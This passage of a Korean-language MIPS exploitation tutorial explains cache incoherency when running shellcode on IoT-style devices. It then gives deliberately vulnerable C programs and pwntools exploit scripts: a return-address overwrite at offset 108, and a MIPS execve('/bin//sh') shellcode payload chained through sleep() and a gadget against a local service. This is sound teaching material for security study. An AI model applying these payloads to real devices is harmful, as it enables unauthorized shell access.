&amp;#xAE30;&amp;#xBCF8;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xAC00;&amp;#xC7A5; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC778; &amp;#xD615;&amp;#xD0DC;&amp;#xC774;&amp;#xBBC0;&amp;#xB85C;, &amp;#xC0C1;&amp;#xD669;&amp;#xACFC; &amp;#xD658;&amp;#xACBD;&amp;#xC5D0; &amp;#xB9DE;&amp;#xCDB0; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC778;&amp;#xC790;&amp;#xC640; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xC798; &amp;#xC870;&amp;#xD569;&amp;#xD558;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;move    $t9, $s1         ; $s1(system &amp;#xC8FC;&amp;#xC18C;)&amp;#xC744; $t9(&amp;#xD638;&amp;#xCD9C;&amp;#xC6A9; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;)&amp;#xB85C; &amp;#xC774;&amp;#xB3D9;
jalr    $t9              ; $t9&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xC810;&amp;#xD504;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD568;&amp;#xC218; &amp;#xC2E4;&amp;#xD589;&amp;#xC740; &lt;code&gt;jalr&lt;/code&gt; &amp;#xBA85;&amp;#xB839;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. x86-64&amp;#xC758; &lt;code&gt;call&lt;/code&gt;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; &amp;#xBA85;&amp;#xB839;&amp;#xCC98;&amp;#xB7FC; &amp;#xB3D9;&amp;#xC791; &amp;#xB41C;&amp;#xB2E4;&amp;#xACE0; &amp;#xC774;&amp;#xD574;&amp;#xD558;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;3-Cache-Incoherency&#34;&gt;&lt;a href=&#34;#3-Cache-Incoherency&#34; class=&#34;headerlink&#34; title=&#34;3. Cache Incoherency&#34;&gt;&lt;/a&gt;3. Cache Incoherency&lt;/h2&gt;&lt;p&gt;MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&amp;#xB41C; &amp;#xC2E4;&amp;#xC81C; &amp;#xC7A5;&amp;#xBE44;&amp;#xB97C; &amp;#xC775;&amp;#xC2A4;&amp;#xD560; &amp;#xB54C;, IoT/&amp;#xC784;&amp;#xBCA0;&amp;#xB514;&amp;#xB4DC; &amp;#xC7A5;&amp;#xBE44; &amp;#xD2B9;&amp;#xC131; &amp;#xC0C1; Shellcode&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xACBD;&amp;#xC6B0;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7EC;&amp;#xB098; MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; Shellcode&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xB54C;&amp;#xB294; &amp;#xC8FC;&amp;#xC758;&amp;#xD560; &amp;#xC810;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xBC14;&amp;#xB85C; Cache&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image3.png&#34; alt=&#34;image3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;MIPS&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; opcode&amp;#xAC00; &amp;#xB4E4;&amp;#xC5B4;&amp;#xC788;&amp;#xB294; Instruction Cache, &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xAE30;&amp;#xB85D;&amp;#xD558;&amp;#xB294; Data Cache &amp;#xB450; &amp;#xAC00;&amp;#xC9C0;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB54C;, &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC785;&amp;#xB825;&amp;#xD558;&amp;#xB294; &amp;#xAC12;(Shellcode)&amp;#xC740; Data Cache&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xAC8C; &amp;#xB418;&amp;#xB294;&amp;#xB370;, CPU&amp;#xB294; &amp;#xAE30;&amp;#xC874;&amp;#xC5D0; &amp;#xBA85;&amp;#xB839;&amp;#xC774; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC04; Instruction Cache&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; Cache Incoherency(&amp;#xCE90;&amp;#xC2DC; &amp;#xBE44;&amp;#xC77C;&amp;#xAD00;&amp;#xC131;) &amp;#xBB38;&amp;#xC81C;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB97C; &amp;#xD574;&amp;#xACB0;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C;&amp;#xB294; Data Cache&amp;#xC5D0;&amp;#xC11C; Instruction Cache&amp;#xB85C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC640;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB294; Cache &amp;#xC4F0;&amp;#xAE30; &amp;#xC815;&amp;#xCC45;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C;, &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC640; &amp;#xB3D9;&amp;#xAE30;&amp;#xD654; &amp;#xD55C; &amp;#xD6C4; Instruction Cache&amp;#xB97C; &amp;#xBE44;&amp;#xC6B0;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xAC83;&amp;#xC740; &amp;#xBC14;&amp;#xB85C; Data Cache&amp;#xB97C; flush&amp;#xD558;&amp;#xC5EC; Cache write&amp;#xB97C; &amp;#xD574;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image4.png&#34; alt=&#34;image4.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Data Cache&amp;#xAC00; flush&amp;#xAC00; &amp;#xB41C; &amp;#xD6C4;&amp;#xC758; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC640; Cache &amp;#xC0C1;&amp;#xD0DC;&amp;#xB294; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. Instruction Cache&amp;#xC640; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xBA85;&amp;#xB839;&amp;#xC774; &amp;#xB3D9;&amp;#xC77C;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC73C;&amp;#xBBC0;&amp;#xB85C;, Instruction Cache&amp;#xB97C; &amp;#xBE44;&amp;#xC6C1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC640; &amp;#xB3D9;&amp;#xAE30;&amp;#xD654; &amp;#xB41C; Data Cache&amp;#xC5D0; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB7F0; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xAC70;&amp;#xCCD0;&amp;#xC57C; &amp;#xBE44;&amp;#xB85C;&amp;#xC18C; &amp;#xC0BD;&amp;#xC785;&amp;#xD55C; Shellcode&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xC774; &amp;#xB420; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xD750;&amp;#xB984;&amp;#xC774; &amp;#xB41C;&amp;#xB2E4;&amp;#xACE0; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image5.png&#34; alt=&#34;image5.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xAC00;&amp;#xC7A5; &amp;#xC190;&amp;#xC26C;&amp;#xC6B4; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &lt;code&gt;sleep()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sleep()&lt;/code&gt; &amp;#xD638;&amp;#xCD9C; &amp;#xC2DC;, &amp;#xB2E4;&amp;#xB978; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB098; &amp;#xC2A4;&amp;#xB808;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC2E4;&amp;#xD589;&amp;#xC774; &amp;#xB118;&amp;#xC5B4;&amp;#xAC00;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;, Data Cache&amp;#xC5D0; &amp;#xB2E4;&amp;#xB978; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB4E4;&amp;#xC774; &amp;#xC0DD;&amp;#xC131;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; Cache &amp;#xC4F0;&amp;#xAE30; &amp;#xC815;&amp;#xCC45;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C;, flush&amp;#xAC00; &amp;#xB418;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB3C4; Data Cache&amp;#xAC00; write &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C;, MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C; shellcode&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74;, &lt;code&gt;sleep()&lt;/code&gt; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC88B;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;4-MIPS-Exploit-Practice&#34;&gt;&lt;a href=&#34;#4-MIPS-Exploit-Practice&#34; class=&#34;headerlink&#34; title=&#34;4. MIPS Exploit Practice&#34;&gt;&lt;/a&gt;4. MIPS Exploit Practice&lt;/h2&gt;&lt;p&gt;&amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC81C;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574;&amp;#xC11C; MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C;&amp;#xC758; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xC5F0;&amp;#xC2B5;&amp;#xD574;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;4-1-RTL&#34;&gt;&lt;a href=&#34;#4-1-RTL&#34; class=&#34;headerlink&#34; title=&#34;4-1: RTL&#34;&gt;&lt;/a&gt;4-1: RTL&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
        system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
        setvbuf(&lt;span class=&#34;hljs-built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, _IONBF, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);

        &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;];
        &lt;span class=&#34;hljs-built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;, buf);
        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, buf);
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;MIPS &amp;#xD658;&amp;#xACBD;&amp;#xC5D0;&amp;#xC11C;&amp;#xC758; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC778; RTL&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC2A4;&amp;#xD0DD; &amp;#xB0B4; offset&amp;#xC744; &amp;#xAD6C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD574;&amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xC5EC; bof&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xC608;&amp;#xC81C; &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;0x00400738 &amp;lt;main+4&amp;gt;:    sw      ra,132(sp)  ; ret
0x0040073c &amp;lt;main+8&amp;gt;:    sw      s8,128(sp)
0x00400740 &amp;lt;main+12&amp;gt;:	  move	  s8,sp
...
0x0040079c &amp;lt;main+104&amp;gt;:	addiu	  v0,s8,24  ; buf
0x004007a0 &amp;lt;main+108&amp;gt;:	move	  a1,v0
...
0x004007b0 &amp;lt;main+124&amp;gt;:	jalr	  t9  ; scanf&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gdb&amp;#xB85C; &amp;#xC5B4;&amp;#xC148;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC740; offset&amp;#xC744; &amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;: &lt;code&gt;sp + 132&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xB294; ra &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130;&amp;#xC5D0; sp+132 &amp;#xAC12;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;#xBC84;&amp;#xD37C; &amp;#xC2DC;&amp;#xC791;: &lt;code&gt;sp + 24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;scanf()&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xB294; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130; &lt;code&gt;sp&lt;/code&gt; &amp;#x2192; &lt;code&gt;s8 + 24&lt;/code&gt; &amp;#xC5F0;&amp;#xC0B0;&amp;#xC774; &amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; offset&amp;#xC740; 132 - 24 = 108&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *

p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3312&lt;/span&gt;)

sh = &lt;span class=&#34;hljs-number&#34;&gt;0x4006e0&lt;/span&gt;

pay = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt;
pay += p32(sh)

p.sendline(pay)
p.interactive()&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;image6.png&#34; alt=&#34;image6.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;offset&amp;#xC744; &amp;#xB9DE;&amp;#xCD94;&amp;#xC5B4; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD574;&amp;#xC11C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xC798; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;4-2-shellcode&#34;&gt;&lt;a href=&#34;#4-2-shellcode&#34; class=&#34;headerlink&#34; title=&#34;4-2: shellcode&#34;&gt;&lt;/a&gt;4-2: shellcode&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
        setvbuf(&lt;span class=&#34;hljs-built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, _IONBF, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
        sleep(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);

        &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;];
        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;buf: %p\n&amp;quot;&lt;/span&gt;, buf);
        &lt;span class=&#34;hljs-built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;, buf);
        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, buf);
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC55E;&amp;#xC11C; &amp;#xC124;&amp;#xBA85;&amp;#xD55C; MIPS&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; Cache Incoherency&amp;#xB97C; &amp;#xACE0;&amp;#xB824;&amp;#xD558;&amp;#xC5EC; shellcode&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xC608;&amp;#xC81C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5ED;&amp;#xC2DC; bof&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xB418;&amp;#xB294; &amp;#xCF54;&amp;#xB4DC;&amp;#xACE0;, NX&amp;#xB97C; &amp;#xD574;&amp;#xC81C;&amp;#xD558;&amp;#xC5EC; &amp;#xBE4C;&amp;#xB4DC; &amp;#xD558;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB9AC;&amp;#xD134; &amp;#xC8FC;&amp;#xC18C; offset&amp;#xC740; &amp;#xC774;&amp;#xC804; &amp;#xBB38;&amp;#xC81C;&amp;#xC640; &amp;#xB3D9;&amp;#xC77C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image7.png&#34; alt=&#34;image7.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC2A4;&amp;#xD0DD; &amp;#xC815;&amp;#xB9AC; &amp;#xAC00;&amp;#xC82F;&amp;#xC740; &lt;code&gt;__libc_csu_init&lt;/code&gt;&amp;#xB0B4; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *
&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; time

p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3312&lt;/span&gt;)

sh = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x69\x6e\x02\x3c\x2f\x62\x42\x24\xec\xff\xa2\xaf\x73\x68\x03\x3c\x2f\x2f\x63\x24\xf0\xff\xa3\xaf\xf4\xff\xa0\xaf\xfc\xff\xa0\xaf\xfc\xff\xa6\x27\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01&amp;quot;&lt;/span&gt;

sleep_addr = &lt;span class=&#34;hljs-number&#34;&gt;0x00400970&lt;/span&gt;
gadget = &lt;span class=&#34;hljs-number&#34;&gt;0x00400824&lt;/span&gt;

p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;buf: &amp;quot;&lt;/span&gt;)
addr = int(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)

log.success(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;addr is {}&amp;quot;&lt;/span&gt;.format(hex(addr)))

pay = sh
pay += &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * (&lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt; - len(sh))
pay += p32(sleep_addr)
pay += p32(gadget)
pay += p32(addr)

time.sleep(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)
p.sendline(pay)
p.interactive()&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;image8.png&#34; alt=&#34;image8.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;sleep()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xACE0;, &amp;#xC2A4;&amp;#xD0DD; &amp;#xC815;&amp;#xB9AC; &amp;#xAC00;&amp;#xC82F; &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0; shellcode &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xC2DD;&amp;#xC774; &amp;#xAC00;&amp;#xC7A5; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. Shellcode&amp;#xB294; MIPS&amp;#xC6A9;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
